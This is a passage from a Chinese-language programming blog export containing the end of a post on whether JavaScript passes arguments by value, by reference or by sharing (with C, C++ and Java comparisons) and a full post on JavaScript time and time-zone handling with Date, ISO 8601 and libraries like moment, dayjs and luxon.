不過看完之後還是沒有得到解答，只有個模糊的概念，覺得這可能是一個名詞定義的問題。 抱著追根究柢的精神，我決定來看看 ECMAScript 怎麼說。 探索聖經的路程ECMAScript 的 spec 就是 JavaScript 的聖經，在裡面你可以找到更底層的實作，而且內容絕對不會出錯。 目前能找到的相關文章，大部分的參考資料來源都是這裡：ECMA-262-3 in detail. Chapter 8. Evaluation strategy. 我原本以為這篇是 ECMA-262-3 的節錄，看完之後發現根本不是，其實只是某個人看完 ECMA-262-3 之後的筆記而已。 不過這篇其實寫得很不錯，我們可以直接看結論的部分： It can be either “call by value”, with specifying that the special case of call by value is meant — when the value is the address copy. From this position it is possible to say that everything in ECMAScript are passed by value. Or, “call by sharing”, which makes this distinction from “by reference”, and “by value”. In this case it is possible to separate passing types: primitive values are passed by value and objects — by sharing. The statement “objects are passed by reference” formally is not related to ECMAScript and is incorrect. 但可惜的是沒有說 ECMA-262 裡面到底哪個部分有提到這些，而且我怎麼查都查不到有任何人的文章有附上 ECMA-262 的參考來源。 沒辦法，只好自己找了。 我從ecma international上面下載了ECMA-262 edition 8，並且利用幾個關鍵字來找： call by reference call by value pass by reference pass by value 結果呢？結果一無所獲，完全搜尋不到這些字。接著只好把關鍵字縮小一點，利用：reference、sharing等等的關鍵字去找，找到6.2.4 The Reference Specification Type，雖然看似相關，但沒有找到最關鍵的部分。 八百多頁的文章，這樣慢慢找實在是很累，而這樣子找下來，依舊沒有任何收穫。接著我轉個念頭：「那我來搜尋 arguments 好了」，找到兩個看似相關的章節（9.4.4 ArgumentsExoticObjects 與 9.2 ECMAScript Function Objects），但依舊沒有詳細說明。 用上面的關鍵字都找不到，我決定再換個念頭：「那我來查等號的定義好了，要比較 object 的話，應該會寫說如何比較兩個 object 是否相同，應該就會提到 reference 之類的相關詞彙了！」 最後查到了這段： If x and y are the same Object value, return true. Otherwise, return false. 好，有說跟沒說一樣。查了一兩個小時發現幾乎沒進展以後，我決定放棄這個接近九百頁的版本。 後來我去下載了ECMA-262 的第一版，篇幅少很多，只有 200 頁不到，在搜尋了幾個關鍵字發現還是沒什麼結果之後，我決定把整本快速掃過一遍。 先講結論，我還是沒有找到任何跟 call by value&#x2F;reference 有關的地方，可是看到一些滿有趣的東西。 例如說判斷是否相等的地方寫的不太一樣： 11.9.3 The Abstract Equality Comparison Algorithm 13.Return true if x and y refer to the same object or if they refer to objects joined to each other (see 13.1.2). Otherwise, return false. 提到了一個叫做 joined objects 的東西： 不過跟我們想找的地方還是不太一樣。 於是，我放棄了從 ECMAScript 去找答案的這個想法。 在覺得無助的同時，想起了一個也有著相似問題（到底是 call by value 還是 call by reference）的程式語言：Java。 Java is always pass-by-value以前在寫 Java 的時候也有碰過這個問題，而且跟 JavaScript 的其實一模一樣，就是你傳一般的值進去是 by value，可是你傳 object 進去的時候又表現的像 call by reference，但是賦值的時候又不會改變外面的 object。 但看起來 Java 永遠都是 pass by value 已經是個共識了，可參考 Is Java “pass-by-reference” or “pass-by-value”?、Parameter passing in Java - by reference or by value? 跟 Java is Pass-by-Value, Dammit!。 理由其實跟我們最開始說的一樣，讓我節錄 Java is Pass-by-Value, Dammit! 的其中一句： However, Objects are not passed by reference. A correct statement would be Object references are passed by value. 以及 Parameter passing in Java - by reference or by value? 的其中一段： Now that we have some definitions of terms we can return to the question. Does Java pass objects by reference or by value? The answer is NO! The fact is that Java has no facility whatsoever to pass an object to any function! The reason is that Java has no variables that contain objects. The reason there is so much confusion is people tend to blur the distinction between an object reference variable and an object instance. All object instances in Java are allocated on the heap and can only be accessed through object references. So if I have the following: StringBuffer g &#x3D; new StringBuffer( “Hello” ); The variable g does not contain the string “Hello”, it contains a reference (or pointer) to an object instance that contains the string “Hello”. g 這個變數的值並不是字串Hello，而是一個指到字串 Hello 的 reference，所以你在呼叫 function 的時候，傳進去的就是這個 reference。 我傳進去的是 reference，可是這樣並不叫 call by reference？ 聽起來超級無敵奇怪，但根本原因其實是「此 reference 非彼 reference」，我節錄一段Call by value？中的內容： Java 中 Call by value，指的是傳遞參數時，一律傳遞變數所儲存的值，無論是基本型態或是類別宣告的型態都一樣，Java 中不允許處理記憶體位址，所以用了「參考」這個名稱來作為解釋類別型態所宣告的變數之行為，但這邊的「參考」與 C++ 中所稱之「參考」，是完全不相同的行為，更不會有 C++ 中參數的傳值、傳參考、return 的傳值、傳參考的 Call by reference 行為。 就是呢，我們傳進去的的確是 reference，但這個 reference 跟 C++ 裡面所稱的「call by reference」其實是不一樣的，所以不能稱作「call by reference」。 這一段其實跟犀牛書裡面11.2. By Value Versus by Reference提到的是差不多的： Before we leave the topic of manipulating objects and arrays by reference, we need to clear up a point of nomenclature. The phrase “pass by reference” can have several meanings. To some readers, the phrase refers to a function invocation technique that allows a function to assign new values to its arguments and to have those modified values visible outside the function. This is not the way the term is used in this book. Here, we mean simply that a reference to an object or array – not the object itself – is passed to a function. A function can use the reference to modify properties of the object or elements of the array. But if the function overwrites the reference with a reference to a new object or array, that modification is not visible outside of the function. Readers familiar with the other meaning of this term may prefer to say that objects and arrays are passed by value, but the value that is passed is actually a reference rather than the object itself 不過這個時候我有了另外一個疑問：那 C++ 裡面的 call by reference 到底是怎樣？ 嗯，看來是時候複習一下很久沒碰的 C 跟 C++了。 C 與 C++ 的參數傳遞先從 C 開始吧，C 裡面就只有一種：call by value。 #include &lt;stdio.h> void swap(int a, int b) &#123; int temp = b; b = a; a = temp; &#125; int main()&#123; int x = 10; int y = 20; swap(x, y); printf(\"%d %d\\n\", x, y); // 10, 20 &#125; 就像我們一開始所說的，這樣子並不會把x跟y的值交換，因為a跟b只是儲存的值跟x與y一樣而已，除此之外一點關係都沒有。 可是呢，我們之前有提到，C 裡面有個東西叫做「指標」，能夠儲存記憶體位置。透過指標我們其實可以在 function 裡面更改外部變數的值。 #include &lt;stdio.h> void swap(int *a, int *b) &#123; // 印出 a 跟 b 所存的值 printf(\"%ld, %ld\", a, b); //0x44, 0x40 int temp = *b; *b = *a; *a = temp; &#125; int main()&#123; int x = 10; int y = 20; // 印出 x 跟 y 的記憶體位置 printf(\"%ld %ld\\n\", &amp;x, &amp;y); // 0x44, 0x40 swap(&amp;x, &amp;y); // 傳記憶體位置進去 printf(\"%d %d\\n\", x, y); // 20, 10 &#125; 我們這次傳進去 function 的不是一個變數，而是一個記憶體位置，在swap裡面用指標來接受這個記憶體位置，接著就可以透過指標的操作把外面x與y的值改掉。 這樣依然叫做 call by value，如果你還是不清楚為什麼，可以參考下面這個範例。跟上面的差別在於我先宣告兩個指標指向x跟y： #include &lt;stdio.h> void swap(int *a, int *b) &#123; // 印出 a 跟 b 所存的值 printf(\"%ld, %ld\", a, b); //0x44, 0x40 int temp = *b; *b = *a; *a = temp; &#125; int main()&#123; int x = 10; int y = 20; // 兩個指標指向 x 跟 y int* ptr_x = &amp;x; int* ptr_y = &amp;y; // 印出 x 跟 y 的記憶體位置（就是 ptr_x 跟 ptr_y 存的值） printf(\"%ld %ld\\n\", ptr_x, ptr_y); // 0x44, 0x40 swap(ptr_x, ptr_y); // 傳記憶體位置進去 printf(\"%d %d\\n\", x, y); // 20, 10 &#125; 還記得前面說過的 call by value 的定義嗎？就是把變數的值複製一份傳進去。這邊也是一樣的，我們傳進去的兩個變數ptr_x跟ptr_y儲存了x跟y的記憶體位置，而我們在呼叫 function 的時候就把這兩個「值」給複製一份傳進去，所以 function 裡面的a跟b印出來的值就會跟ptr_x以及ptr_y存的值一樣。 簡單來說就是以前我們 call by value 的「value」可能是數字，可能是字串，而現在的範例這個 value 是「記憶體位置」，也是資料型態的一種。 不過，也有人把這樣子稱為 call by pointer 或是 call by address，但原則上都是 call by value 的一種。 在這邊還有一個可以特別注意的地方，那就是儘管a跟ptr_x的「值」一樣，但這兩個還是不一樣的變數，有著不同的記憶體位置。 再來我們看 C++ 中的 call by reference 到底是怎樣，只要在 function 的引數那裡加上&amp;，就會變成 call by reference： #include &lt;stdio.h&gt; &#x2F;&#x2F; 注意到這邊多了 &amp;，其他都跟 call by value 一模一樣 void swap(int &amp;a, int &amp;b) &#123; &#x2F;&#x2F; 印出 a 跟 b 所存的值與記憶體位置 printf(&quot;%ld, %ld\\n&quot;, a, b); &#x2F;&#x2F; 10, 20 printf(&quot;%ld, %ld\\n&quot;, &amp;a, &amp;b); &#x2F;&#x2F; 0x44, 0x40 int temp &#x3D; b; b &#x3D; a; a &#x3D; temp; &#125; int main()&#123; int x &#x3D; 10; int y &#x3D; 20; &#x2F;&#x2F; 印出 x 跟 y 的記憶體位置 printf(&quot;%ld %ld\\n&quot;, &amp;x, &amp;y); &#x2F;&#x2F; 0x44, 0x40 swap(x, y); &#x2F;&#x2F; 傳記憶體位置進去 printf(&quot;%d %d\\n&quot;, x, y); &#x2F;&#x2F; 20, 10 &#125; 在這裡a跟b的記憶體位置與x跟y一模一樣，說明了在裡面操作a這個變數的時候，就是在操作x這個變數，兩者是一模一樣的，只是有了不同的名稱。當a重新賦值的時候，也會一併把外面x的值一起改掉。 看完了 C 跟 C++ 裡面 pass by value 跟 pass by reference 的區別，我開頭的疑惑：「如果你要從底層實作的原理來看，那 call by reference 不也是 call by value 的一種嗎？」就被解決了。 我認為這兩個最大的差異就在於一件事情：複製。 call by value 會把傳進去的值複製（無論那個值是數字也好，記憶體位置也好，都會複製一份），call by reference 在「最底層的實作」上當然也會有類似的行為，但是你感覺不出來。 就像我上面 call by reference 舉例的那段程式碼一樣，x的記憶體位置跟a一樣，y的記憶體位置跟b一樣，因此你可以說他們兩者是「一模一樣」的東西。 可是在 call by value 的範例中，就算你傳的是指標好了，只有「指標裡面存的值（也就是指到的記憶體位置）」是一樣的，但指標本身還是有不同的記憶體位置。 換句話說，在 call by value 的時候我們是「新建了一個變數a，並且讓a存的值跟傳進來的參數一樣」。在 call by reference 的時候，我們只是「讓a作為x的 alias，兩個是同樣的變數」，這是我認為這兩間之間最大的差異。 結論我們從各個程式語言裡面看到了每一種程式語言的實現，那到底有沒有一種明確的定義，能夠區分 pass by value 以及 pass by reference 呢？ 我想了想，其實可以從「行為」上面來判別到底是屬於哪一種。與其由定義來看，不如直接從行為來加以區分，不同種類能夠達成的行為都不一樣。第一個條件用來區分到底是 pass by value 還是 pass by reference：「在函式裡對引數重新賦值，外面變數是否會改變？」 以 JavaScript 跟 Java 為例，在函式裡面重新賦值，外面的變數都不會變，所以就是屬於 pass by value。 如果你還想分得更細，來可以透過第二個條件來區分這個 pass by value 是真・pass by value 還是一個叫做 pass by sharing 的分支：「能否透過引數，改變外部變數的值」（我們這邊所指的「值」跟地址或引用無關，純粹在講像&#123;numer:1&#125;這樣子的值） 在 JavaScript 跟 Java 你都可以透過obj.number = 10之類的操作改變外部變數的值（obj.number 從 1 變成了 10），所以也能說是 pass by sharing。 根據第一個定義：「在函式裡對引數重新賦值，外面變數是否會改變？」，有人可能會發現如果是 C 裡面的指標，不是也可以達成嗎？可是 C 又說只有 call by value，不就衝突了嗎？ 但其實在指標的範例裡面，我們重新賦值的對象是*a而不是a（意思就是，我們是讓*a=10而不是a=10），但後者才叫對引數重新賦值（給a一個新的地址），前者是「對指標所指向的記憶體位置重新賦值」。所以照這個定義來看，指標的範例依舊是 pass by value。 依據細分程度的不同，下面幾句話都是正確的： JavaScript 裡面只有 pass by value JavaScript 的 primitive type 是 pass by value，object 是 pass by sharing 心得說實在的，其實我查了這麼一大堆資料之後，發現大家對 call by reference 以及 call by value 的「定義」其實都不盡相同，而且也沒有一個權威性的出處能夠保證這個定義是正確的（或許有但我沒找到，如果你知道的話請一定要告訴我在哪裡，拜託），才造成這麼多的歧異性。 有關技術名詞的解釋，我最喜歡引用這篇：技術名詞紛爭多： 程式開發的世界中，名詞的創造經常是隨意的，曾經在 Java 中爭執不斷的考古題之一是：「Java 中有沒有 Pass by reference」，就現今來說，大家公認的答案是沒有，Java 只有 Pass by value，不過還是有人面對 Java 文件中經常出現 reference，而搞不清楚。 說穿了，這個名詞與 C++ 中的 reference 定義不同，只不過 Java 最初不知道為什麼，也用了 reference 一詞，重點也不在搞清楚 Pass by value，重點是搞清楚透過參數操作物件時，會有什麼樣的行為。 我們從 JavaScript 研究到 Java，再從 Java 研究到 C 與 C++，為的就是想要搞清楚「pass by reference」的定義為何，但追根究底，會造成這樣子的誤會是因為對於「reference」一詞的定義不同。 如果你把 pass by reference 理解成像 C++ 那樣子的定義，那 Java 跟 JavaScript 都不會有 pass by reference。但如果你把 pass by reference 的「reference」理解成「對於物件的參考」，那 JavaScript 把 object 傳進去，其實就是把「對物件的參考」傳進去，那就可以解釋成是 pass by reference。 都是 reference 這個名詞太好用了，導致不同地方有不同的定義，但那些定義往往相似卻又不全然相同。 可是別忘了，重點其實不在這個，而是搞清楚到底參數在操作的時候會有怎樣的行為。你要知道 JavaScript 傳 object 進去的時候，可以更改原本物件的值，但重新賦值並不會影響到外部的 object。只要知道這一點，其他的我覺得都沒那麼重要了。 這次寫了一個很容易引戰的主題，但也覺得滿有趣的，如果你對這問題有不同的見解，覺得我有哪邊寫錯的話，歡迎指正，感謝。 參考資料 [Javascript] 關於 JS 中的淺拷貝和深拷貝 [筆記] 談談JavaScript中by reference和by value的重要觀念 重新認識 JavaScript: Day 05 JavaScript 是「傳值」或「傳址」？ Re: [問題] 請問傳參考到底是什麼? ECMA-262-3 in detail. Chapter 8. Evaluation strategy. 簡單介紹JavaScript參數傳遞 JavaScript 是传值调用还是传引用调用？ Values vs References semantics #160 Parameter passing in Java - by reference or by value? Is Java “pass-by-reference” or “pass-by-value”? 傳值呼叫 Call by value？ java中的经典问题：传值与传引用 Java is Pass-by-Value, Dammit! 11.2. By Value Versus by Reference","link":"/2018/06/23/javascript-call-by-value-or-reference/"},{"title":"淺談 JavaScript 中的時間與時區處理","text":"前言部落格需要顯示發佈時間，餐廳網站要顯示訂位時間，拍賣網站則是要顯示訂單的各種時間，無論你做什麼，都會碰到「顯示時間」這個很常見的需求。 這問題看似簡單，不就是顯示個時間嗎？但如果牽扯上「時區」的話，問題就會變得再更複雜一些。以時區來說，通常會有這幾個需求： 網站上的時間需要在某個固定時區顯示，我在美國跟在台灣要在網站上看到同樣的時間 網站上的時間會根據使用者的瀏覽器設置不同，我在美國跟在台灣看到的時間會不一樣 PM 根本沒想過這問題，只考慮到當地的使用者，所以暫時不用擔心這個 而這還只是顯示的部分而已，還有另外一個部分是與後端的溝通，這個我們可以待會再提，但總之呢，要正確處理時間跟時區並不是一件簡單的事。 在最近這一兩份工作剛好都有碰過相關的問題，因此對這一塊有點小小心得，就寫了這一篇來跟大家分享一下。 先從 timestamp 開始談起要談時間，我比較喜歡從 timestamp 開始談起，或講得更精確一點是 Unix timestamp。 什麼是 timestamp 呢？你打開 devtool 的 console 然後輸入：console.log(new Date().getTime())，出來的東西就是我們所謂的 timestamp。 而這個 timestamp 指的是：「從 UTC+0 時區的 1970 年 1 月 1 號 0 時 0 分 0 秒開始，總共過了多少毫秒」，而我寫這篇文章的時候得出來的值是 1608905630674。 ECMAScript 的 spec 是這樣寫的： 20.4.1.1 Time Values and Time Range Time measurement in ECMAScript is analogous to time measurement in POSIX, in particular sharing definition in terms of the proleptic Gregorian calendar, an epoch of midnight at the beginning of 01 January, 1970 UTC, and an accounting of every day as comprising exactly 86,400 seconds (each of which is 1000 milliseconds long). 在 Unix 系統中的時間就是這樣表示的，而許多程式語言得到的 timestamp 也都是類似的表示方法，但有些可能只能精確到「秒」，有些可以精確到「毫秒」，如果你發現程式碼中有些地方需要除以 1000 或是乘以 1000，就很有可能是在做秒跟毫秒的轉換。 上面我們有提到「UTC +0」這東西，這其實就是 +0 時區的意思。 舉例來說，臺灣的時區是 +8，或如果要講得更標準一點，就是 GMT +8 或是 UTC +8，這兩者的區別可以參考：到底是 GMT+8 還是 UTC+8 ?，現在的標準基本上都是 UTC 了，所以這篇文章接下來都只會用 UTC。 儲存時間的標準格式有了一些基本概念之後，可以來談該如何儲存時間。其中一種儲存方式就是存上面所說的 timestamp，但缺點是無法用肉眼直接看出時間是什麼，一定要經過轉換。 而另外一種儲存時間的標準叫做 ISO 8601，在許多地方你都可以發現它的蹤影。 例如說 OpenAPI 裡面有定義了一個格式叫做 date-time，它的敘述是這樣寫的： the date-time notation as defined by RFC 3339, section 5.6, for example, 2017-07-21T17:32:28Z 如果你直接去看 RFC 3339 的話，開頭的摘要就已經寫明了： This document defines a date and time format for use in Internet protocols that is a profile of the ISO 8601 standard for representation of dates and times using the Gregorian calendar. 那這到底是個什麼樣的格式呢？其實就是像 2020-12-26T12:38:00Z 這種格式，用字串表現一個帶有時區的時間。 更詳細的規則可以看 RFC： RFC 的規則會定義的比較完整，但總而言之就是我上面說的那種形式，然後最後面如果是 Z 就代表 UTC +0，如果要其他時區可以這樣寫：2020-12-26T12:38:00+08:00，代表 +8 時區的 12 月 26 號 12 點 38 分 0 秒。 在 JavaScript 裡面則是基於一個 ISO 8601 的延伸格式，在 ECMAScript spec 中的 20.4.1.15 Date Time String Format 有提到 ： 其中比較有趣的是年份的部分，除了大家所熟知的四位數 0000~9999 之外，居然還可以有一個六位數的，而且可以有負數，可以表示西元前的年份： 理解了表示時間的標準格式以後，有個重要的觀念要先銘記在心，那就是時間的相對性。 舉例來說，1593163158 這個 timestamp 代表的是：「UTC +0 時區的 2020-06-26 09:19:00」，同時也代表著「UTC +8 時區的 2020-06-26 17:19:00」，這兩個時間是一樣的，都是同一個時間。 所以當你拿到一個 timestamp 以後，你無法從 timestamp 本身知道你應該要顯示成什麼時區的時間。 談完了這些概念之後，我們來聊聊 JS 中怎麼處理這些時間。 JavaScript 中的時間處理在 JS 裡面你可以用 Date 來處理時間相關的需求，例如說 new Date() 可以產生出現在的時間，然後 new Date().toISOString() 就可以產生 ISO 8601 格式的字串，像是：2020-12-26T04:52:26.255Z。 在 new Date() 裡面放上參數的話則是會幫你 parse 時間，例如說 new Date(1593163158000) 或是 new Date(&#39;2020-12-26T04:52:26.255Z&#39;)。 除此之外還有許多 function 可以幫你拿到時間的各個部分，以上面那個字串 2020-12-26T04:52:26.255Z 為例，我們用 new Date(&#39;2020-12-26T04:52:26.255Z&#39;) 搭配底下的各個 function： getYear &#x3D;&gt; 120 getMonth &#x3D;&gt; 11 getDate &#x3D;&gt; 26 getHours &#x3D;&gt; 12 getMinutes &#x3D;&gt; 52 getSeconds &#x3D;&gt; 26 getMilliseconds &#x3D;&gt; 255 有幾個部分看起來完全沒問題，但有些部分看起來很怪，我們挑那些怪異的部分來講解。 getYear你可能預期會拿到 2020 但卻拿到了 120，因為 getYear 會是年份 - 1900 之後的結果，如果你想拿到 2020 要用 getFullYear。 getMonth你會預期拿到 12，但卻拿到了 11，這是因為這邊拿到的數字會從 0 開始，所以如果是 1 月會拿到 0，因此 12 月拿到了 11。 getHours傳進去的時間是 4，所以你預期會拿到 4，但卻拿到了 12。這是因為 JS 在進行這些操作之前，都有一個步驟是把時間轉成「Local Time」： 因此 UTC +0 的 4 點，轉成 UTC +8 就變成 12 點了，因此拿到的就會是 12。 先不論最後那個轉成 local time 的特性，一定有很多人疑惑說為什麼月份要 - 1，然後 getYear 不好好回傳年份就好了。這些設計其實並不是 JS 獨創的，而是直接從 Java 1.0 抄過來的。 雖然說 JavaScript 跟 Java 現在確實沒什麼關係，但在 JavaScript 剛誕生的時候它跟 Java 的淵源其實很深（不然怎麼會取叫這個名字），本來就希望能夠在語法上看起來像是 Java，吸引 Java 的開發者，所以會直接從 Java 1.0 把 java.util.Date 整個抄過來好像也是件能理解的事情。 不過這些設計其實在 JDK 1.1 之後就被 deprecated 了，只是 JavaScript 礙於向下相容的關係只能繼續使用。現在依然可以在 Java 的文件中找到 getMonth 以及 getYear 的說明。 而 getYear 會回傳 -1900 之後的結果在當時應該也是一件正常的事，因為那時候在儲存年份時好像習慣儲存兩位數，例如說 1987 就存 87 而已。這也導致了後來的千禧蟲危機，Year 2000 Problem（簡稱 Y2K），在 2000 年的時候年份會變成 00。 上面這些歷史在 JavaScript: the first 20 years 裡面都有提到，Java date 那一段在第 19 頁。 日期時間需注意的地方用 new Date(string) 就等於 Date.parse(string)，可以讓 JS 來幫你解析一個字串並轉換成時間。如果你給的字串符合標準格式的話那沒有問題，但如果不符合標準的話，就會根據實作的不同而有不同的結果： 這就是需要小心的地方了，比如說這兩個字串： new Date(&#39;2020-02-10&#39;) new Date(&#39;2020&#x2F;02&#x2F;10&#39;) 不都是 2020 年 2 月 10 號嗎？ 但如果你在 Chrome devtool 上面執行，會發現些微的不同： 根據 spec 的說法： When the UTC offset representation is absent, date-only forms are interpreted as a UTC time and date-time forms are interpreted as a local time. 前者是符合 ISO 8601 格式的，所以被解析成為 UTC +0 的 2 月 10 號 0 點 0 分，所以我們看到的結果才會是 +8 時區的 8 點。 而後者並不符合 ISO 8601 格式，所以會根據實作不同而產生不同的結果，而看起來第二種格式 V8 會當作是 local time，V8 的 date parser 在這裡：src&#x2F;date&#x2F;dateparser-inl.h（不過我也還沒找到是哪一段造成這個結果就是了）。 還有另外一個常見的非標準格式是這樣：2020-02-02 13:00:00 這個格式少了一個 T，在 Safari 上面會直接回給你一個 Invalid Date，而在 Chrome 上面則可以正常解析。這我其實覺得滿合理的，你丟一個非標準格式的東西，本來就是 invalid。瀏覽器可以正常解析是額外幫你多做事，但不能正常解析你也不能怪它。 補充：感謝 othree 的留言補充以及討論，這邊其實有一個小細節在 前面有提到 ISO 8601 跟 RFC3339，這兩個其實有一點細微的差異。 在 ISO 8601 裡面寫著： The character [T] shall be used as time designator to indicate the start of the representation of the time of day component in these expressions. NOTE By mutual agreement of the partners in information interchange, the character [T] may be omitted in applications where there is no risk of confusing a date and time of day representation with others defined in this International Standard. 也就是說在 ISO 8601 的標準裡面，T 這個字元在溝通的雙方都同意之下是可以省略的，會變成像是：2020-02-0213:00:00 這樣，但並沒有寫說可以用空白來取代。 而在 RFC3339 裡面則是寫著： NOTE: ISO 8601 defines date and time separated by “T”. Applications using this syntax may choose, for the sake of readability, to specify a full-date and full-time separated by (say) a space character. 所以 RFC3339 為了可讀性，是可以用空白取代 T 的。因此用空白來分隔的字串，遵守 RFC3339 但不遵守 ISO 8601。 那 ECMAScript 是哪一種呢？根據 spec 上的說明，看起來 T 也是必須要有的，所以在 ECMAScript 裡面一個正確的 date time 需要用 T 來分隔，不能用空白取代。 但有趣的事情來了，那就是在 ES5 之前，其實 ECMAScript 的規格裡對於 date time 的格式是沒有說明的，也就是說並沒有講什麼才是標準的格式，所以少了一個 T 也可以解析可以當作是為了支援以前的實作而保留的行為。 （參考資料：In an ISO 8601 date, is the T character mandatory?、Allow space to seperate date and time as per RFC3339） 總之呢，加上 T 之後就沒問題了，加上去之後會變成少了時區的 date time：2020-02-02T13:00:00。 丟到 Chrome 之後是：Sun Feb 02 2020 13:00:00 GMT+0800丟到 Safari 之後是：Sun Feb 02 2020 21:00:00 GMT+0800 根據我們上面貼的 spec 節錄，如果缺少了時區而且是 date time format 的話，應該要當作是 local time 才對，所以 Chrome 的做法是正確的，但 Safari 卻把這個時間當成是 UTC +0 的時間，所以差了八個小時。 我認為這是一個 bug 啦，但是去 webkit 的 bugtracker 沒找到有人回報，或許會這樣做也是有什麼特殊的理由。 以上這些問題也可以參考前端工程研究：關於 JavaScript 中 Date 型別的常見地雷與建議作法，裡面提到了更多瀏覽器上的測試。 但總之只要把握一個原則就對了，就是用標準的格式來溝通，就不會有這些問題了。 2023-11-25 更新感謝底下留言區的讀者 Glenn8119 留言，Safari 已經修正了上述的行為，我去查了一下發現其實還修了更多東西。 上面有提到 Safari 跟 Chrome 不同的兩點： 2020-02-02 13:00:00 會回傳 invalid date 2020-02-02T13:00:00 會當成 +0 時間 這兩個現在都已經修復囉！ 第一個 invalid date 的問題是在 2022 年修好的：Bug 235468: [JSC] Relax Date.parse requirement，修改了 parse 的邏輯，新增了對於空格以及小寫 t 的支援： diff --git a/Source/WTF/wtf/DateMath.cpp b/Source/WTF/wtf/DateMath.cpp index ebd69a4c76cd7acb0a233be552071158ca2171ca..01976e039682c467765ef77d54925dd84a4b7da1 100644 --- a/Source/WTF/wtf/DateMath.cpp +++ b/Source/WTF/wtf/DateMath.cpp @@ -645,7 +645,7 @@ double parseES5DateFromNullTerminatedCharacters(const char* dateString, bool&amp; is return std::numeric_limits&lt;double>::quiet_NaN(); // Look for a time portion. // Note: As of ES2016, when a UTC offset is missing, date-time forms are local time while date-only forms are UTC. - if (*currentPosition == 'T') &#123; + if (*currentPosition == 'T' || *currentPosition == 't' || *currentPosition == ' ') &#123; // Parse the time HH:mm[:ss[.sss]][Z|(+|-)(00:00|0000|00)] currentPosition = parseES5TimePortion(currentPosition + 1, hours, minutes, seconds, milliseconds, isLocalTime, timeZoneSeconds); if (!currentPosition) 而第二個時區的問題更早，在 2020 年就被修復了（不過修復是一回事，deploy 是一回事，我不確定什麼時候 deploy 的）：Bug 89071: JavaScript: Invalid date parse for ISO 8601 strings when no timezone given，對修改有興趣的話可以看這個 commit：https://github.com/WebKit/WebKit/commit/2148a43f377e67c60b167f5730c7b5c5c21b202d 最後來談時區的顯示前面講了這麼多，終於可以來談開頭講的時區的問題了。在處理時間這一塊，比較多人應該都是挑一個順眼的 library 來用，例如說 moment、date-fns、dayjs 或是 luxon 之類的，這些 library 如果沒有正確使用的話，會跟你想像的結果不同。 例如說，請問底下的輸出結果會是什麼？ luxon.DateTime .fromISO('2020-02-02T13:00:00+03:00') .toFormat('HH:mm:ss') ......防雷........ 有許多人都會誤以為如果你的 date time 有帶 timezone 的話，format 出來的結果就會依照那個 timezone。但不是這樣的，最後 format 還是會以 local time 為主。 所以上面的例子中，由於我的電腦是臺灣 +8 時區，所以結果會是 18:00:00 而不是 13:00:00。 這點大家一定要記住，無論是 dayjs 或是 moment 也都一樣，如果沒有在 format 之前特別指定時區，format 出來的結果都會依照使用者當前的時區。所以同一段程式碼，在不同使用者的電腦可能會有不同的輸出。 因此 Server 端給你什麼都不重要，給你 2020-02-02T13:00:00+03:00 或是 2020-02-02T10:00:00Z 或 2020-02-02T18:00:00+08:00，對前端來說都是一樣的，都代表著同一個時間，用 format 也都會產生出一樣的結果。 如果你想要用 date time 裡的時區為主的話，可以這樣使用： luxon.DateTime .fromISO('2020-02-02T13:00:00+03:00', &#123; setZone: true &#125;) .toFormat('HH:mm:ss') 但是大部分情形下會建議的做法都是由前端自行決定要顯示成哪個時區的時間，而不是由後端給的 date time 來決定。 那要怎麼決定顯示成哪個時區呢？以 luxon 來說會是這樣： luxon.DateTime .fromISO('2020-02-02T13:00:00+03:00') .setZone('Asia/Tokyo') .toFormat('HH:mm:ss') moment 則是這樣： moment('2020-02-02T13:00:00+03:00') .tz('Asia/Tokyo') .format('HH:mm:ss') dayjs 也類似： dayjs('2020-02-02T13:00:00+03:00') .tz('Asia/Tokyo') .format('HH:mm:ss') 透過這樣的方式，我們就可以保證輸出的時間一定是固定在同一個時區。什麼時候會需要這樣做呢？例如說我之前待過的一間公司是餐廳訂位的網站，後端會傳給我們餐廳可以訂位的時段，像是下午一點，下午兩點之類的，這邊後端會用標準格式給我們，例如說：2020-02-02T13:00:00+08:00，代表 2020 年 2 月 2 號的下午 1 點可以訂位。 在前端顯示的時候，如果只是用 moment(&#39;2020-02-02T13:00:00+08:00&#39;).format(&#39;HH:mm&#39;) 的話，在我的電腦上看會是正確的，結果會是 13:00，這往往也是 bug 的開端，因為自己看是正確的就覺得是正確的。 若是換了一個時區，假設換到日本好了，那同一段程式碼所產生出的結果就是 12:00，就是預期外的結果了。因為要訂的是臺灣的餐廳，所以訂位時間應該都要顯示台灣時間才對，而不是使用者電腦時區的時間。 這時候就要按照上面所說的，用： moment('2020-02-02T13:00:00+03:00') .tz('Asia/Taipei') .format('HH:mm:ss') 就能夠保證在日本或在其他地方的使用者，看到的都是用臺灣時區顯示的結果。 送時間到後端去前面講的是後端給你一個時間然後你要正確顯示出來，解法就是上面所說的，加上正確的 method，才能確保是以固定的時區顯示時間。 還有另外一種需要注意的則是相反過來，那就是前端要產生一個 date time 送到後端去。 舉例來說，延續之前餐廳訂位網站的例子好了，假設今天有一個聯絡客服的頁面要填去餐廳的日期，格式是：2020-12-26 這樣子，但你送到後端去的資料會是 date time，所以你要把它變成 ISO 8601 的標準格式。 這時候你會怎麼做呢？ 有些人會想說，這不就很簡單嗎？原生的方法就是 new Date(&#39;2020-12-26&#39;).toISOString()，如果用其他 library 可能就是：moment(&#39;2020-12-26&#39;).format()。 但其實這是不對的。 假設去的餐廳是在台灣的餐廳，那這個 2020-12-26 就應該是台灣時間，正確的輸出應該要是：2020-12-26T00:00:00+08:00 或是 2020-12-25T16:00:00Z 之類的，簡單來說就是台灣時間的 12 月 26 號 0 點 0 分。 而上面的程式碼，你有可能產生的是「UTC +0 時區的 0 點 0 分」或者是「使用者電腦時區的 0 點 0 分」，這時候產生出來的 date time 就會是錯誤的，就有了時差。 正確的使用方式跟剛剛差不多，你需要去呼叫 timezone 相關的 method，像是這樣： // moment moment.tz('2020-12-26', 'Asia/Taipei').format() // dayjs dayjs.tz('2020-12-26', 'Asia/Taipei').format() 才能正確告訴 library 說：「我的這個日期是在台北的日期，而不是在 UTC 也不是在使用者時區」。 總結在處理時間的時候，最常碰到的就是多一天或是少一天的問題，明明就應該顯示 12&#x2F;26，怎麼使用者看到的是 12&#x2F;25？而會有這些問題，往往都跟時區有關，沒有正確處理好時區的話就會產生這些問題。 在處理時區上面只要能謹記幾個原則，就可以避免掉這些基本的問題： 前後端都用標準格式的字串溝通 由前端來決定用什麼時區顯示 前端產生 date time 時記得想一下要不要指定時區 不過除了這些之外，我也有想到有些問題滿有趣的，例如說生日，生日感覺就應該直接存成一個字串而不是 date time string。 